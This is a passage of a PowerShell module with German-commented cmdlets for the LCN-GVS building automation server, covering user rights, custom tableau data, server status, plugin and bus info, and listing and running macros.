    [Alias('Get-UserRights')]
    [OutputType([String[]])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSUserRights))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $UserRights = $Script:LCNGVSSession.UserRights
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $UserRights
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Prueft ob der Benutzer ueber das angegebene Recht verfuegt.    
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ueberpruefen, ob der Benutzer ueber das angegebene Recht verfuegt.
    .EXAMPLE
        Test-LCNGVSUserRight -UserRight MacroManagementRight
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSSession
        Get-LCNGVSUserRights
#>
function Test-LCNGVSUserRight # Alias: 'Check-UserRight'
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Test-LCNGVSUserRight',
                  ConfirmImpact='Medium')]
    [Alias('Check-UserRight')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.PowerShellModul.UserRight] $UserRight
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.CheckLCNGVSUserRight))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:LCNGVSSession.UserRights.Contains($UserRight.ToString())
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

# -----------------------------------------------
# LCNGVS.Authentification.CustomData
# -----------------------------------------------

<#
    .SYNOPSIS
        Ruft Ihre kuerzlich geoeffneten Tableaus ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Liste der kuerzlich geoeffneten Tableaus des Benutzers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSRecentTableauList
    .LINK
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSRecentTableauList
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSRecentTableauList',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.StringProperty[]])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSRecentTableauList))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Strings = $Script:LCNGVSSession.CustomData.Strings
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Strings | Where-Object -Property name -EQ -Value "RecentTableauUri"
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft das letzte geoeffnete Tableau ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie das letzte geoeffneten Tableau des Benutzers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSLastTableauUri
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSLastTableauUri
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSLastTableauUri',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.StringProperty[]])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSLastTableauUri))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Strings = $Script:LCNGVSSession.CustomData.Strings
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Strings | Where-Object -Property name -EQ -Value "LastTableauUri"
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

function Set-LCNGVSLastTableauUri
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Tableau.Tableau] $Tableau
    )
    
    ((Get-LCNGVSSession).CustomData.Strings | Where-Object -Property name -EQ -Value "LastTableauUri").Value = Create-TableauUri -Tableau $Tableau
    Set-LCNGVSCustomData -CustomData (Get-LCNGVSSession).CustomData
}

<#
    .SYNOPSIS
        Ruft Schnelltableaus des Benutzers ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Schnelltableaus des Benutzers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSQuickTableauUri
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSQuickTableauUri
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSLastTableauUri',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.StringProperty[]])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSLastTableauUri))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Strings = $Script:LCNGVSSession.CustomData.Strings
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Strings | Where-Object -Property name -EQ -Value QuickTableauUri
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft die Benutzerdaten des Benutzers ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Benutzerdaten des Benutzers anzeigen lassen.
        U.a. werden die kuerzlich geoeffneten Tableaus angezeigt, aber auch die Schnelltableaus.
    .EXAMPLE
        Get-LCNGVSCustomData
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Set-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Get-LCNGVSCustomData
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.CustomData])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSCustomData))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $CustomData = $Script:LCNGVSSession.CustomData
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $CustomData
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Erstellt neue Benutzerdaten des Benutzers.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Benutzerdaten des Benutzers neu erstellen.
        U.a. werden die kuerzlich geoeffneten Tableaus, aber auch die Schnelltableaus festgelegt.
    .EXAMPLE
        New-LCNGVSCustomData
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        Set-LCNGVSCustomData 
#>
function New-LCNGVSCustomData
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/New-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Authentification.CustomData])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.NewLCNGVSCustomData))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $CustomData = [LCNGVS.Authentification.CustomData]::new()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $CustomData
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Setzt die Benutzerdaten des Benutzers.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Benutzerdaten des Benutzers setzen lassen.
        U.a. werden die kuerzlich geoeffneten Tableaus, aber auch die Schnelltableaus festgelegt.
    .EXAMPLE
        Set-LCNGVSCustomData -CustomData $CustomData
    .LINK
        Get-LCNGVSRecentTableauList
        Get-LCNGVSLastTableauUri
        Get-LCNGVSCustomData
        New-LCNGVSCustomData
#>
function Set-LCNGVSCustomData
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSCustomData',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param(
        [LCNGVS.Authentification.CustomData]
        $CustomData
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.SetLCNGVSCustomData))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:authSvc.SetUserCustomData($CustomData)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

# -----------------------------------------------
# LCNGVS.Authentification.ServerInfo
# -----------------------------------------------

<#
    .SYNOPSIS
        Ruft die Informationen des LCN-GVS-Servers ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Informationen des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerInfo
    .LINK
        Get-LCNGVSServerInfoAsync
#>
function Get-LCNGVSServerInfo
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-ServerInfo')]
    [OutputType([LCNGVS.Authentification.ServerInfo])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSServerInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $ServerInfo = $Script:authSvc.GetServerInfo()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $ServerInfo
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }        
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft die Informationen des LCN-GVS-Servers ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Informationen des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerInfoAsync
    .LINK
        Get-LCNGVSServerInfo
#>
function Get-LCNGVSServerInfoAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-ServerInfoAsync')]
    [OutputType([LCNGVS.Authentification.ServerInfo])]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSServerInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:authSvc.GetServerInfoAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }        
    }
    End
    {
    }
}

#endregion

# -----------------------------------------------
# Webservice: Status
# -----------------------------------------------
#region WebService: Status

<#
    .SYNOPSIS
        Ruft den Status des LCN-GVS-Servers ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den Status des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerStatus
    .LINK
        Get-LCNGVSServerStatusAsync
        Get-LCNGVSServerPluginInfo
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerStatus # Alias: Get-Status
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerStatus',
                  ConfirmImpact='Medium')]
    [Alias('Get-Status')]
    [OutputType([LCNGVS.Status.Status])]
    Param
    (        
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerStatus))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $LCNStatus = $Script:Status1Svc.GetStatus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $LCNStatus
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft den Status des LCN-GVS-Servers ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den Status des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerStatusAsync
    .LINK
        Get-LCNGVSServerStatus
        Get-LCNGVSServerPluginInfo
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerStatusAsync # Alias: Get-StatusAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerStatus',
                  ConfirmImpact='Medium')]
    [Alias('Get-StatusAsync')]
    [OutputType([LCNGVS.Status.Status])]
    Param
    (        
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerStatus))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:Status1Svc.GetStatusAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft Informationen ueber die installierten Plugins ab.   
    .DESCRIPTION
        Mit diesem Befehl koennen Sie Informationen ueber die installierten Plugins, wie beispielsweise die Lizenzen, anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerPluginInfo
    .LINK
        Get-LCNGVSServerStatus
        Get-LCNGVSServerStatusAsync
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerPluginInfo # Alias: Get-PluginInfo
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerPluginInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-PluginInfo')]
    [OutputType([LCNGVS.Status.PluginInfo[]])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [SupportsWildcards()]
        [String] $PlugInName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerPluginInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $LCNStatus = $Script:Status1Svc.GetStatus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        $LCNStatus.Plugins | Where-Object -Property name -Like -Value $PlugInName
                    }
                    else
                    {
                        $LCNStatus.Plugins
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft Informationen ueber die Verbindung des LCN-Busses ab.   
    .DESCRIPTION
        Eine LCN-Bus-Verbindung ist die physikalische Verbindung zur Geb�ude-Anlage. 
        Mit diesem Befehl koennen Sie Informationen ueber die Verbindung des LCN-Busses anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerPluginInfo
    .LINK
        Get-LCNGVSServerStatus
        Get-LCNGVSServerStatusAsync
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerLcnBusConnectionState # Alias: Get-LcnBusConnectionState
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerLcnBusConnectionState',
                  ConfirmImpact='Medium')]
    [Alias('Get-LcnBusConnectionState')]
    [OutputType([LCNGVS.Status.LcnBusConnectionState[]])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [SupportsWildcards()]
        [String] $BusName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerPluginInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $LCNStatus = $Script:Status1Svc.GetStatus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        $LCNStatus.LcnBusConnectionStates | Where-Object -Property BusName -Like -Value $BusName
                    }
                    else
                    {
                        $LCNStatus.LcnBusConnectionStates
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

#endregion

# -----------------------------------------------
# Webservice: MacroServer - Makros
# -----------------------------------------------
#region WebService: MacroServer

<#
    .SYNOPSIS
        Ruft den Status des Macroservers ab.  
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den derzeitigen Status des Macroservers abrufen.
    .EXAMPLE
        Get-LCNGVSMacroServerEnabled
    .LINK
        Set-LCNGVSMacroServerEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Get-LCNGVSMacroServerEnabled
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMacroServerEnabled',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([Bool])]
    Param
    (
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.GetLCNGVSMacroServerEnabled))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MacroServer1Svc.IsEnabled()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

<#
    .SYNOPSIS
        Legt den Status des Macroservers fest.  
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den Status des Macroservers festlegen.
    .EXAMPLE
        Set-LCNGVSMacroServerEnabled -Enabled $true
    .LINK
        Get-LCNGVSMacroServerEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Set-LCNGVSMacroServerEnabled
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSMacroServerEnabled',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([Bool])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [bool] $Enabled
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.SetLCNGVSMacroServerEnabled))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MacroServer1Svc.SetEnabled($Enabled)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft das Macro ab.  
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros abrufen.
    .EXAMPLE
        Get-LCNGVSMacro
    .EXAMPLE
        Get-LCNGVSMacro -all
    .EXAMPLE
        Get-LCNGVSMacro -macroName "Garagen*"
    .EXAMPLE
        Get-LCNGVSMacro -macroName "Geragentor oeffnen"
    .LINK
        Get-LCNGVSMacroServerEnabled
        Set-LCNGVSMacroServerEnabled
        Get-LCNGVSMacroListAsync
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Get-LCNGVSMacro
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMacro',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MacroServer.Macro[]])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [SupportsWildcards()]
        [String] $macroName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.GetLCNGVSMacro))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $MacroList = $Script:MacroServer1Svc.GetMacros()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        $MacroList | Where-Object -Property name -Like -Value $macroName
                    }
                    else
                    {
                        $MacroList
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft eine Liste von verfuegbaren Makros ab.  
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros abrufen.
    .EXAMPLE
        Get-LCNGVSMacroListAsync
    .LINK
        Get-LCNGVSMacroServerEnabled
        Set-LCNGVSMacroServerEnabled
        Get-LCNGVSMacro
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Get-LCNGVSMacroListAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMacroAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MacroServer.Macro[]])]
    Param
    (
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.GetLCNGVSMacro))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MacroServer1Svc.GetMacrosAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Fuehrt das angegebene Makro aus.  
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros ausfuehren.  
    .PARAMETER macroName
        Geben Sie den eindeutigen Namen des Makros an.
    .EXAMPLE
        Invoke-LCNGVSMacro -macroName "Garagentor oeffnen"
    .LINK
        Invoke-LCNGVSMacroAsync
        Get-LCNGVSMacroServerEnabled
        Set-LCNGVSMacroServerEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
#>
function Invoke-LCNGVSMacro
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSMacro',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias("name")]
        [String] $macroName
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
